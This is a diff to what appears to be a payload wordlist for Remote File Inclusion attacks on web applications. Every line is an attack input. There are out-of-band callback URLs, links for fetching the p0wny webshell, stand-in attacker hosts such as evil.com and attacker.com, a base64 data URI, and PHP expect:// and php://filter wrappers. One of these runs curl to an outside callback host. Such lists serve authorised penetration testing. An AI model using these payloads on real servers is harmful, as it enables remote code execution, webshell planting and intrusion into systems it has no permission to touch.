@@ -1,6 +1,20 @@
+# OOB (Out-of-Band) Detection - Blind RFI
+http://requestbin.cn/rfi_callback
+https://requestbin.cn/rfi_detection
+http://burpcollaborator.net/rfi_test
+https://interact.sh/rfi_oob
+
+# p0wny shell (popular webshell)
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+http://attacker.com/p0wny.php
+https://pastebin.com/raw/p0wny_shell
+
+# Classic RFI payloads
 http://evil.com/shell.txt
-https://attacker.com/p0wny.php
 //evil.com/shell.txt
 http://192.168.1.1/shell.txt
+
+# Data URIs and wrappers
 data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
-expect://curl http://attacker.com/callback
+expect://curl http://requestbin.cn/rfi_callback
+php://filter/convert.base64-encode/resource=http://requestbin.cn/rfi
